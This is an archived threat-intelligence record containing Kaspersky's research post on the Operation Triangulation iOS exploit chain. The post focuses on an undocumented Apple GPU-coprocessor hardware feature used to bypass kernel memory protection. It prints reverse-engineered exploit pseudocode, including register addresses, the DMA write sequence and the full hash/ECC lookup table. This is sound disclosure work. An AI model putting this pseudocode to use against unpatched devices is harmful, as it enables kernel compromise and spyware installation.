{
    "id": "6f62c23a-03c8-47b5-8957-5e7ff9c4109b",
    "created_at": "2024-12-17T02:05:51.466411Z",
    "updated_at": "2025-03-27T02:09:51.969997Z",
    "deleted_at": null,
    "sha1_hash": "837998879b95838c33584012305e7d1fd23827ff",
    "title": "Operation Triangulation: The last (hardware) mystery",
    "authors": "Kaspersky",
    "file_creation_date": "2024-12-16T14:45:09Z",
    "file_modification_date": "2024-12-16T14:45:09Z",
    "file_size": 784545,
    "plain_text": "# Operation Triangulation: The last (hardware) mystery\n\n**[securelist.com/operation-triangulation-the-last-hardware-mystery/111669](https://securelist.com/operation-triangulation-the-last-hardware-mystery/111669/)**\n\nBoris Larin\n\nAuthors\n\n[Boris Larin](https://securelist.com/author/borislarin/)\n\n[Today, on December 27, 2023, we (Boris Larin,](https://twitter.com/oct0xor) [Leonid Bezvershenko, and](https://twitter.com/bzvr_) [Georgy Kucherin)](https://twitter.com/kucher1n)\ndelivered a presentation, titled, “Operation Triangulation: What You Get When Attack\niPhones of Researchers”, at the 37th Chaos Communication Congress (37C3), held at\nCongress Center Hamburg. The presentation summarized the results of our long-term\n[research into Operation Triangulation, conducted with our colleagues, Igor Kuznetsov,](https://twitter.com/2igosha)\n[Valentin Pashkov, and](https://securelist.com/author/valentinpashkov/) [Mikhail Vinogradov.](https://securelist.com/author/mikhailvinogradov/)\n\nThis presentation was also the first time we had publicly disclosed the details of all exploits\nand vulnerabilities that were used in the attack. We discover and analyze new exploits and\nattacks using these on a daily basis, and we have discovered and reported more than thirty\nin-the-wild zero-days in Adobe, Apple, Google, and Microsoft products, but this is definitely\nthe most sophisticated attack chain we have ever seen.\n\n## Operation Triangulation’ attack chain\n\nHere is a quick rundown of this 0-click iMessage attack, which used four zero-days and was\ndesigned to work on iOS versions up to iOS 16.2.\n\nAttackers send a malicious iMessage attachment, which the application processes\nwithout showing any signs to the user.\n[This attachment exploits the remote code execution vulnerability CVE-2023-41990 in](https://support.apple.com/en-us/HT213842)\nthe undocumented, Apple-only ADJUST TrueType font instruction. This instruction had\nexisted since the early nineties before a patch removed it.\nIt uses return/jump oriented programming and multiple stages written in the\nNSExpression/NSPredicate query language, patching the JavaScriptCore library\nenvironment to execute a privilege escalation exploit written in JavaScript.\nThis JavaScript exploit is obfuscated to make it completely unreadable and to minimize\nits size. Still, it has around 11,000 lines of code, which are mainly dedicated to\nJavaScriptCore and kernel memory parsing and manipulation.\nIt exploits the JavaScriptCore debugging feature DollarVM ($vm) to gain the ability to\nmanipulate JavaScriptCore’s memory from the script and execute native API functions.\nIt was designed to support both old and new iPhones and included a Pointer\nAuthentication Code (PAC) bypass for exploitation of recent models.\n\n\n-----\n\n[It uses the integer overflow vulnerability CVE-2023-32434 in XNU s memory mapping](https://support.apple.com/en-us/103837)\nsyscalls (mach_make_memory_entry and vm_map) to obtain read/write access to the\nentire physical memory of the device at user level.\nIt uses hardware memory-mapped I/O (MMIO) registers to bypass the Page Protection\n[Layer (PPL). This was mitigated as CVE-2023-38606.](https://support.apple.com/en-us/HT213841)\nAfter exploiting all the vulnerabilities, the JavaScript exploit can do whatever it wants to\nthe device including running spyware, but the attackers chose to: (a) launch the\nIMAgent process and inject a payload that clears the exploitation artefacts from the\ndevice; (b) run a Safari process in invisible mode and forward it to a web page with the\nnext stage.\nThe web page has a script that verifies the victim and, if the checks pass, receives the\nnext stage: the Safari exploit.\n[The Safari exploit uses CVE-2023-32435 to execute a shellcode.](https://support.apple.com/en-us/HT213676)\nThe shellcode executes another kernel exploit in the form of a Mach object file. It uses\n[the same vulnerabilities: CVE-2023-32434 and](https://support.apple.com/en-us/103837) [CVE-2023-38606. It is also massive in](https://support.apple.com/en-us/HT213841)\nterms of size and functionality, but completely different from the kernel exploit written in\nJavaScript. Certain parts related to exploitation of the above-mentioned vulnerabilities\nare all that the two share. Still, most of its code is also dedicated to parsing and\nmanipulation of the kernel memory. It contains various post-exploitation utilities, which\nare mostly unused.\nThe exploit obtains root privileges and proceeds to execute other stages, which load\n[spyware. We covered these stages in our previous posts.](https://securelist.com/trng-2023/)\n\nWe are almost done reverse-engineering every aspect of this attack chain, and we will be\nreleasing a series of articles next year detailing each vulnerability and how it was exploited.\n\n\n-----\n\nHowever, there are certain aspects to one particular vulnerability that we have not been able\nto fully understand.\n\n## The mystery and the CVE-2023-38606 vulnerability\n\nWhat we want to discuss is related to the vulnerability that has been mitigated as CVE-2023[38606. Recent iPhone models have additional hardware-based security protection for](https://support.apple.com/guide/security/operating-system-integrity-sec8b776536b/web)\nsensitive regions of the kernel memory. This protection prevents attackers from obtaining full\ncontrol over the device if they can read and write kernel memory, as achieved in this attack\n[by exploiting CVE-2023-32434. We discovered that to bypass this hardware-based security](https://support.apple.com/en-us/103837)\n[protection, the attackers used another hardware feature of Apple-designed SoCs.](https://en.wikipedia.org/wiki/System_on_a_chip)\n\nIf we try to describe this feature and how the attackers took advantage of it, it all comes\ndown to this: they are able to write data to a certain physical address while bypassing the\nhardware-based memory protection by writing the data, destination address, and data hash\nto unknown hardware registers of the chip unused by the firmware.\n\nOur guess is that this unknown hardware feature was most likely intended to be used for\ndebugging or testing purposes by Apple engineers or the factory, or that it was included by\nmistake. Because this feature is not used by the firmware, we have no idea how attackers\nwould know how to use it.\n\nWe are publishing the technical details, so that other iOS security researchers can confirm\nour findings and come up with possible explanations of how the attackers learned about this\nhardware feature.\n\n## Technical details\n\nVarious peripheral devices available in the SoC may provide special hardware registers that\ncan be used by the CPU to operate these devices. For this to work, these hardware registers\nare mapped to the memory accessible by the CPU and are known as “memory-mapped I/O\n(MMIO)“.\n\nAddress ranges for MMIOs of peripheral devices in Apple products (iPhones, Macs, and\n[others) are stored in a special file format: DeviceTree. Device tree files can be extracted from](https://www.theiphonewiki.com/wiki/DeviceTree)\n[the firmware, and their contents can be viewed with the help of the dt utility.](https://github.com/Siguza/dt)\n\n\n-----\n\n_Example of how MMIO ranges are stored in the device tree_\n\nFor example, in this screenshot, you can see the start (0x210f00000) and the size (0x50000)\nof the acc-impl MMIO range for cpu0.\n\nWhile analyzing the exploit used in the Operation Triangulation attack, I discovered that most\nof the MMIOs used by the attackers to bypass the hardware-based kernel memory protection\ndo not belong to any MMIO ranges defined in the device tree. The exploit targets Apple A12–\nA16 Bionic SoCs, targeting unknown MMIO blocks of registers that are located at the\nfollowing addresses: 0x206040000, 0x206140000, and 0x206150000.\n\nThe prompted me to try something. I checked different device tree files for different devices\nand different firmware files: no luck. I checked publicly available source code: no luck. I\nchecked the kernel images, kernel extensions, iboot, and coprocessor firmware in search of\na direct reference to these addresses: nothing.\n\nHow could it be that that the exploit used MMIOs that were not used by the firmware? How\ndid the attackers find out about them? What peripheral device(s) do these MMIO addresses\nbelong to?\n\nIt occurred to me that I should check what other known MMIOs were located in the area\nclose to these unknown MMIO blocks. That approach was successful.\n\nLet us take a look at a dump of the device tree entry for gfx-asc, which is the GPU\ncoprocessor.\n\n\n-----\n\n_Dump of the device tree entry for gfx-asc_\n\nIt has two MMIO ranges: 0x206400000–0x20646C000 and 0x206050000–0x206050008. Let\nus take a look at how they correlate with the regions used by the exploit.\n\n_Correlation of the gfx-asc MMIO ranges and the addresses used by the exploit_\n\nTo be more precise, the exploit uses the following unknown addresses: 0x206040000,\n0x206140008, 0x206140108, 0x206150020, 0x206150040, and 0x206150048. We can see\nthat most of these are located in the area between the two gfx-asc regions, and the\nremaining one is located close to the beginning of the first gfx-asc region. This suggested\nthat all these MMIO registers most likely belonged to the GPU coprocessor!\n\nAfter that, I took a closer look at the exploit and found one more thing that confirmed my\ntheory. The first thing the exploit does during initialization is writing to some other MMIO\nregister, which is located at a different address for each SoC.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n\nif (cpuid == 0x8765EDEA):  # CPUFAMILY_ARM_EVEREST_SAWTOOTH (A16)\n\nbase = 0x23B700408\n\ncommand = 0x1F0023FF\n\nelif (cpuid == 0xDA33D83D): # CPUFAMILY_ARM_AVALANCHE_BLIZZARD (A15)\n\nbase = 0x23B7003C8\n\ncommand = 0x1F0023FF\n\nelif (cpuid == 0x1B588BB3): # CPUFAMILY_ARM_FIRESTORM_ICESTORM (A14)\n\nbase = 0x23B7003D0\n\ncommand = 0x1F0023FF\n\nelif (cpuid == 0x462504D2): # CPUFAMILY_ARM_LIGHTNING_THUNDER (A13)\n\nbase = 0x23B080390\n\ncommand = 0x1F0003FF\n\nelif (cpuid == 0x07D34B9F): # CPUFAMILY_ARM_VORTEX_TEMPEST (A12)\n\nbase = 0x23B080388\n\ncommand = 0x1F0003FF\n\nif ((~read_dword(base) & 0xF) != 0):\n\nwrite_dword(base, command)\n\nwhile(True):\n\nif ((~read_dword(base) & 0xF) == 0):\n\nbreak\n\n\n_Pseudocode for the GFX power manager control code from the exploit_\n\n\n-----\n\nWith the help of the device tree and Siguza s utility, [pmgr, I was able to discover that all](https://github.com/Siguza/dt)\nthese addresses corresponded to the GFX register in the power manager MMIO range.\n\nFinally, I obtained a third confirmation when I decided to try and access the registers located\nin these unknown regions. Almost instantly, the GPU coprocessor panicked with a message\nof, “GFX SERROR Exception class=0x2f (SError interrupt), IL=1, iss=0 – power(1)”.\n\nThis way, I was able to confirm that all these unknown MMIO registers used for the\nexploitation belonged to the GPU coprocessor. This motivated me to take a deeper look at its\nfirmware, which is also written in ARM and unencrypted, but I could not find anything related\nto these registers in there.\n\nI decided to take a closer look at how the exploit operated these unknown MMIO registers.\nThe register 0x206040000 stands out from all the others because it is located in a separate\nMMIO block from all the other registers. It is touched only during the initialization and\nfinalization stages of the exploit: it is the first register to be set during initialization and the\nlast one, during finalization. From my experience, it was clear that the register either\nenabled/disabled the hardware feature used by the exploit or controlled interrupts. I started\nto follow the interrupt route, and fairly soon, I was able to recognize this unknown register,\n0x206040000, and also discovered what exactly was mapped to the address range of\n0x206000000–0x206050000. Below, you can see the reverse-engineered code of the exploit\nthat I was able to recognize. I have given it a proper name.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n\ndef ml_dbgwrap_halt_cpu():\n\nvalue = read_qword(0x206040000)\n\nif ((value & 0x90000000) != 0):\n\nreturn\n\nwrite_qword(0x206040000, value | 0x80000000)\n\nwhile (True):\n\nif ((read_qword(0x206040000) & 0x10000000) != 0):\n\nbreak\n\ndef ml_dbgwrap_unhalt_cpu():\n\nvalue = read_qword(0x206040000)\n\nvalue = (value & 0xFFFFFFFF2FFFFFFF) | 0x40000000\n\nwrite_qword(0x206040000, value)\n\nwhile (True):\n\nif ((read_qword(0x206040000) & 0x10000000) == 0):\n\nbreak\n\n\n_Pseudocode for the usage of the, 0x206040000 register by the exploit_\n\nI was able to match the ml_dbgwrap_halt_cpu function from the pseudocode above to a\nfunction with the same name in the dbgwrap.c file of the XNU source code. This file contains\n[code for working with the ARM CoreSight MMIO debug registers of the main CPU. The](https://developer.arm.com/Architectures/CoreSight%20Architecture)\nsource code states that there are four CoreSight-related MMIO regions named ED CTI\n\n\n-----\n\nPMU, and UTT. Each occupies 0x10000 bytes, and they are all located next to one another.\nThe ml_dbgwrap_halt_cpu function uses the UTT region, and the source code states that,\nunlike the other three, it does not come from ARM, but is a proprietary Apple feature that was\nadded just for convenience.\n\nI was able to confirm that 0x206000000–0x206050000 was indeed a block of CoreSight\nMMIO debug registers for the GPU coprocessor by writing\nARM_DBG_LOCK_ACCESS_KEY to the corresponding location. Each core of the main\nCPU has its own block of CoreSight MMIO debug registers, but unlike the GPU coprocessor,\ntheir addresses can be found in the device tree.\n\nIt is also interesting that the author(s) of this exploit knew how to use the proprietary Apple\nUTT region to unhalt the CPU: this code is not part of the XNU source code. Perhaps it is fair\nto say that this could easily be found out through experimentation.\n\nSomething that cannot be found that way is what the attackers did with the registers in the\nsecond unknown region. I am not sure what blocks of MMIO debug registers are located\nthere, or how the attackers found out how to use them if they were not used by the firmware.\n\nLet us look at the remaining unknown registers used by the exploit.\n\nThe registers 0x206140008 and 0x206140108 control enabling/disabling and running the\nhardware feature used by the exploit.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n\ndef dma_ctrl_1():\n\nctrl = 0x206140108\n\nvalue = read_qword(ctrl)\n\nwrite_qword(ctrl, value | 0x8000000000000001)\n\nsleep(1)\n\nwhile ((~read_qword(ctrl) & 0x8000000000000001) != 0):\n\nsleep(1)\n\ndef dma_ctrl_2(flag):\n\n\n-----\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n27\n\n28\n\n29\n\n30\n\n31\n\n32\n\n33\n\n34\n\n35\n\n36\n\n37\n\n38\n\n39\n\n40\n\n41\n\n\nctrl = 0x206140008\n\nvalue = read_qword(ctrl)\n\nif (flag):\n\nif ((value & 0x1000000000000000) == 0):\n\nvalue = value | 0x1000000000000000\n\nwrite_qword(ctrl, value)\n\nelse:\n\nif ((value & 0x1000000000000000) != 0):\n\nvalue = value & ~0x1000000000000000\n\nwrite_qword(ctrl, value)\n\ndef dma_ctrl_3(value):\n\nctrl = 0x206140108\n\nvalue = value | 0x8000000000000000\n\nwrite_qword(ctrl, read_qword(ctrl) & value)\n\nwhile ((read_qword(ctrl) & 0x8000000000000001) != 0):\n\nsleep(1)\n\ndef dma_init(original_value_0x206140108):\n\ndma_ctrl_1()\n\ndma ctrl 2(False)\n\n\n-----\n\n42\n\n43\n\n44\n\n45\n\n46\n\n47\n\n48\n\n\ndma_ctrl_3(original_value_0x206140108)\n\ndef dma_done(original_value_0x206140108):\n\ndma_ctrl_1()\n\ndma_ctrl_2(True)\n\ndma_ctrl_3(original_value_0x206140108)\n\n\n_Pseudocode for the usage of the 0x206140008 and 0x206140108 registers by the exploit_\n\nThe register 0x206150020 is used only for Apple A15/A16 Bionic SoCs. It is set to 1 during\nthe initialization stage of the exploit, and to its original value, during the finalization stage.\n\nThe register 0x206150040 is used to store some flags and the lower half of the destination\nphysical address.\n\nThe last register, 0x206150048, is used for storing the data that needs to be written and the\nupper half of the destination physical address, bundled together with the data hash and\nanother value (possibly a command). This hardware feature writes the data in aligned blocks\nof 0x40 bytes, and everything should be written to the 0x206150048 register in nine\nsequential writes.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n\nif (cpuid == 0x8765EDEA):  # CPUFAMILY_ARM_EVEREST_SAWTOOTH (A16)\n\ni = 8\n\nmask = 0x7FFFFFF\n\nelif (cpuid == 0xDA33D83D): # CPUFAMILY_ARM_AVALANCHE_BLIZZARD (A15)\n\ni = 8\n\nmask = 0x3FFFFF\n\nelif (cpuid == 0x1B588BB3): # CPUFAMILY_ARM_FIRESTORM_ICESTORM (A14)\n\ni = 0x28\n\nmask = 0x3FFFFF\n\n\n-----\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n27\n\n28\n\n29\n\n30\n\n31\n\n32\n\n33\n\n34\n\n35\n\n36\n\n37\n\n\nelif (cpuid == 0x462504D2): # CPUFAMILY_ARM_LIGHTNING_THUNDER (A13)\n\ni = 0x28\n\nmask = 0x3FFFFF\n\nelif (cpuid == 0x07D34B9F): # CPUFAMILY_ARM_VORTEX_TEMPEST (A12)\n\ni = 0x28\n\nmask = 0x3FFFFF\n\ndma_init(original_value_0x206140108)\n\nhash1 = calculate_hash(data)\n\nhash2 = calculate_hash(data+0x20)\n\nwrite_qword(0x206150040, 0x2000000 | (phys_addr & 0x3FC0))\n\npos = 0\n\nwhile (pos < 0x40):\n\nwrite_qword(0x206150048, read_qword(data + pos))\n\npos += 8\n\nphys_addr_upper = ((((phys_addr >> 14) & mask) << 18) & 0x3FFFFFFFFFFFF)\n\nvalue = phys_addr_upper | (hash1 << i) | (hash2 << 50) | 0x1F\n\nwrite_qword(0x206150048, value)\n\ndma_done(original_value_0x206140108)\n\n\n_Pseudocode for the usage of the 0x206150040 and 0x206150048 registers by the exploit_\n\n\n-----\n\nAs long as everything is done correctly, the hardware should perform a direct memory\naccess (DMA) operation and write the data to the requested location.\n\nThe exploit uses this hardware feature as a Page Protection Layer (PPL) bypass, mainly for\npatching page table entries. It can also be used for patching the data in the protected\n__PPLDATA segment. The exploit does not use the feature to patch the kernel code, but\nonce during a test, I was able to overwrite an instruction in the __TEXT_EXEC segment of\nthe kernel and get an “Undefined Kernel Instruction” panic with the expected address and\nvalue. This only worked once—the other times I tried I got an AMCC panic. I have an idea\nabout what I did right that one time it worked, and I am planning to look deeper into this in\nthe future, because I think it would be really cool to take a vulnerability that was used to harm\nus and use it for something good, like enabling kernel debugging on new iPhones.\n\nNow that all the work with all the MMIO registers has been covered, let us take a look at one\nlast thing: how hashes are calculated. The algorithm is shown below.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n\nsbox = [\n\n0x007, 0x00B, 0x00D, 0x013, 0x00E, 0x015, 0x01F, 0x016,\n\n0x019, 0x023, 0x02F, 0x037, 0x04F, 0x01A, 0x025, 0x043,\n\n0x03B, 0x057, 0x08F, 0x01C, 0x026, 0x029, 0x03D, 0x045,\n\n0x05B, 0x083, 0x097, 0x03E, 0x05D, 0x09B, 0x067, 0x117,\n\n0x02A, 0x031, 0x046, 0x049, 0x085, 0x103, 0x05E, 0x09D,\n\n0x06B, 0x0A7, 0x11B, 0x217, 0x09E, 0x06D, 0x0AB, 0x0C7,\n\n0x127, 0x02C, 0x032, 0x04A, 0x051, 0x086, 0x089, 0x105,\n\n0x203, 0x06E, 0x0AD, 0x12B, 0x147, 0x227, 0x034, 0x04C,\n\n0x052, 0x076, 0x08A, 0x091, 0x0AE, 0x106, 0x109, 0x0D3,\n\n0x12D, 0x205, 0x22B, 0x247, 0x07A, 0x0D5, 0x153, 0x22D,\n\n0x038, 0x054, 0x08C, 0x092, 0x061, 0x10A, 0x111, 0x206,\n\n0x209, 0x07C, 0x0BA, 0x0D6, 0x155, 0x193, 0x253, 0x28B,\n\n0x307, 0x0BC, 0x0DA, 0x156, 0x255, 0x293, 0x30B, 0x058,\n\n0x094, 0x062, 0x10C, 0x112, 0x0A1, 0x20A, 0x211, 0x0DC,\n\n0x196, 0x199, 0x256, 0x165, 0x259, 0x263, 0x30D, 0x313,\n\n0x098, 0x064, 0x114, 0x0A2, 0x15C, 0x0EA, 0x20C, 0x0C1,\n\n0x121 0x212 0x166 0x19A 0x299 0x265 0x2A3 0x315\n\n\n-----\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n27\n\n28\n\n29\n\n30\n\n31\n\n32\n\n33\n\n34\n\n35\n\n36\n\n37\n\n38\n\n39\n\n40\n\n41\n\n42\n\n43\n\n44\n\n45\n\n46\n\n\n0x0EC, 0x1A6, 0x29A, 0x266, 0x1A9, 0x269, 0x319, 0x2C3,\n\n0x323, 0x068, 0x0A4, 0x118, 0x0C2, 0x122, 0x214, 0x141,\n\n0x221, 0x0F4, 0x16C, 0x1AA, 0x2A9, 0x325, 0x343, 0x0F8,\n\n0x174, 0x1AC, 0x2AA, 0x326, 0x329, 0x345, 0x383, 0x070,\n\n0x0A8, 0x0C4, 0x124, 0x218, 0x142, 0x222, 0x181, 0x241,\n\n0x178, 0x2AC, 0x32A, 0x2D1, 0x0B0, 0x0C8, 0x128, 0x144,\n\n0x1B8, 0x224, 0x1D4, 0x182, 0x242, 0x2D2, 0x32C, 0x281,\n\n0x351, 0x389, 0x1D8, 0x2D4, 0x352, 0x38A, 0x391, 0x0D0,\n\n0x130, 0x148, 0x228, 0x184, 0x244, 0x282, 0x301, 0x1E4,\n\n0x2D8, 0x354, 0x38C, 0x392, 0x1E8, 0x2E4, 0x358, 0x394,\n\n0x362, 0x3A1, 0x150, 0x230, 0x188, 0x248, 0x284, 0x302,\n\n0x1F0, 0x2E8, 0x364, 0x398, 0x3A2, 0x0E0, 0x190, 0x250,\n\n0x2F0, 0x288, 0x368, 0x304, 0x3A4, 0x370, 0x3A8, 0x3C4,\n\n0x160, 0x290, 0x308, 0x3B0, 0x3C8, 0x3D0, 0x1A0, 0x260,\n\n0x310, 0x1C0, 0x2A0, 0x3E0, 0x2C0, 0x320, 0x340, 0x380\n\n]\n\ndef calculate_hash(buffer):\n\nacc = 0\n\nfor i in range(8):\n\npos = i * 4\n\nvalue = read_dword(buffer + pos)\n\nfor j in range(32):\n\nif (((value >> j) & 1) != 0):\n\nacc ^= sbox[32 * i + j]\n\nreturn acc\n\n\n-----\n\n_Pseudocode for the hash function used by this unknown hardware feature_\n\nAs you can see, it is a custom algorithm, and the hash is calculated by using a predefined\nsbox table. I tried to search for it in a large collection of binaries, but found nothing.\n\nYou may notice that this hash does not look very secure, as it occupies just 20 bits (10+10,\nas it is calculated twice), but it does its job as long as no one knows how to calculate and use\n[it. It is best summarized with the term “security by obscurity“.](https://encyclopedia.kaspersky.com/glossary/security-by-obscurity-security-through-obscurity/?utm_source=securelist&utm_medium=blog&utm_campaign=termin-explanation)\n\nHow could attackers discover and exploit this hardware feature if it is not used and there are\nno instructions anywhere in the firmware on how to use it?\n\nI ran one more test. I checked and found that the M1 chip inside the Mac also has this\n[unknown hardware feature. Then I used the amazing m1n1 tool to conduct an experiment.](https://github.com/AsahiLinux/m1n1)\nThis tool has a trace_range function, which traces all access to a provided range of MMIO\nregisters. I used it to set up tracing for the memory range 0x206110000–0x206400000, but it\nreported no usage of these registers by macOS.\n\nThrough an amazing coincidence, both my 37C3 presentation and this post discuss a\nvulnerability very similar to the one I talked about during my presentation at the 36th Chaos\nCommunication Congress (36C3) in 2019.\n\nIn the presentation titled, “Hacking Sony PlayStation Blu-ray Drives”, I talked about how I\nwas able to dump firmware and achieve code execution on the Blu-ray drives of Sony\nPlayStation 3 and 4 by using MMIO DMA registers that were accessible through SCSI\ncommands.\n\n\n-----\n\nWatch Video At: https://youtu.be/WW39dsbffMw\n\nI was able to discover and exploit this vulnerability, because earlier versions of the firmware\nused these registers for all DRAM operations, but then Sony stopped using them and started\njust accessing DRAM directly, because all DRAM was also mapped to the CPU address\nspace. Because no one was using these registers anymore and I knew how to use them, I\ntook advantage of them. It did not need to know any secret hash algorithm.\n\nCould something similar have happened in this case? I do not know that, but this GPU\ncoprocessor first appeared in the recent Apple SoCs. In my personal opinion, based on all\nthe information that I provided above, I highly doubt that this hardware feature was\npreviously used for anything in retail firmware. Nevertheless, there is a possibility that it was\npreviously revealed by mistake in some particular firmware or XNU source code release and\nthen removed.\n\nI was hoping to find out what was located inside the second unknown region from the fix for\nthis vulnerability implemented in iOS 16.6. I was able to find out how Apple mitigated this\nissue, but they obfuscated the fix.\n\nApple mitigated this vulnerability by adding the MMIO ranges 0x206000000–0x206050000\nand 0x206110000–0x206400000 used by the exploit to the pmap-io-ranges stored in the\ndevice tree. XNU uses the information stored there to determine whether to allow mapping of\ncertain physical addresses. All entries stored there have a meaningful tag name that explains\nwhat kind of memory the range belongs to.\n\n\n-----\n\n_Example of entries stored in the pmap-io-ranges_\n\nHere, PCIe stands for “Peripheral Component Interconnect Express”, DART stands for\n“Device Address Resolution Table”, DAPF means “Device Address Filter”, and so on.\n\nAnd here are the tag names for regions used by the exploit. They stand out from the rest.\n\n_Entries for regions used by the exploit_\n\n## Conclusion\n\nThis is no ordinary vulnerability, and we have many unanswered questions. We do not know\nhow the attackers learned to use this unknown hardware feature or what its original purpose\nwas. Neither do we know if it was developed by Apple or it’s a third-party component like\nARM CoreSight.\n\nWhat we do know—and what this vulnerability demonstrates—is that advanced hardwarebased protections are useless in the face of a sophisticated attacker as long as there are\nhardware features that can bypass those protections.\n\nHardware security very often relies on “security through obscurity”, and it is much more\ndifficult to reverse-engineer than software, but this is a flawed approach, because sooner or\nlater, all secrets are revealed. Systems that rely on “security through obscurity” can never be\ntruly secure.\n\n\n-----\n\n## Update 2024-01-09\n\n[Famous hardware hacker Hector Martin (marcan) was able to figure out that what we](https://en.wikipedia.org/wiki/Hector_Martin_(hacker))\nthought was a custom hash was actually something a little different. It is an error correction\ncode (ECC), or more precisely, a [Hamming code with a custom lookup table (what we call](https://en.wikipedia.org/wiki/Hamming_code)\n“sbox table” in the text above).\n\nThis discovery helps us understand the original purpose of this unknown hardware feature.\nWe originally thought it was a debugging feature that provided direct memory access to the\nmemory and was protected with a “dummy” hash for extra security. But the fact that it\ninvolves an ECC, coupled with the unstable behavior observed when trying to use it to patch\nthe kernel code, leads to the conclusion that this hardware feature provides direct memory\naccess to the cache.\n\nThis discovery also raises the possibility that this unused hardware feature could have been\nfound through experimentation, but to do so would require attackers to solve a large number\nof unknown variables. Attackers could find values in a custom lookup table using brute force,\nbut they would also need to know that such a powerful cache debugging feature exists, that it\ninvolves Hamming code and, most importantly, they would need to know the location and\npurpose of all the MMIO registers involved, and how and in what order to interact with them.\nWere the attackers able to resolve all these unknown variables by themselves or was this\ninformation revealed somewhere by mistake? It still remains a mystery.\n\nOperation Triangulation: The last (hardware) mystery\n\nYour email address will not be published. Required fields are marked *\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/9o8mtuwfoe2mu6zv0cio2yff2z8s357c"
    ],
    "report_names": [
        "Kaspersky_OperationTriangulation-TheLastMystery(12-27-2023)"
    ],
    "threat_actors": [
        {
            "id": "ad08bd3d-e65c-4cfd-874a-9944380573fd",
            "created_at": "2023-06-23T02:04:34.517668Z",
            "updated_at": "2025-03-27T02:02:10.081419Z",
            "deleted_at": null,
            "main_name": "Operation Triangulation",
            "aliases": [],
            "source_name": "ETDA:Operation Triangulation",
            "tools": [
                "TriangleDB"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bc289ba8-bc61-474c-8462-a3f7179d97bb",
            "created_at": "2022-10-25T16:07:24.450609Z",
            "updated_at": "2025-03-27T02:02:10.235933Z",
            "deleted_at": null,
            "main_name": "Avalanche",
            "aliases": [],
            "source_name": "ETDA:Avalanche",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "113b8930-4626-4fa0-9a3a-bcf3ef86f595",
            "created_at": "2024-02-06T02:00:04.14393Z",
            "updated_at": "2025-03-27T02:00:03.324612Z",
            "deleted_at": null,
            "main_name": "Operation Triangulation",
            "aliases": [],
            "source_name": "MISPGALAXY:Operation Triangulation",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1734401151,
    "ts_updated_at": 1743041391,
    "ts_creation_date": 1734360309,
    "ts_modification_date": 1734360309,
    "files": {
        "pdf": "https://archive.orkl.eu/837998879b95838c33584012305e7d1fd23827ff.pdf",
        "text": "https://archive.orkl.eu/837998879b95838c33584012305e7d1fd23827ff.txt",
        "img": "https://archive.orkl.eu/837998879b95838c33584012305e7d1fd23827ff.jpg"
    }
}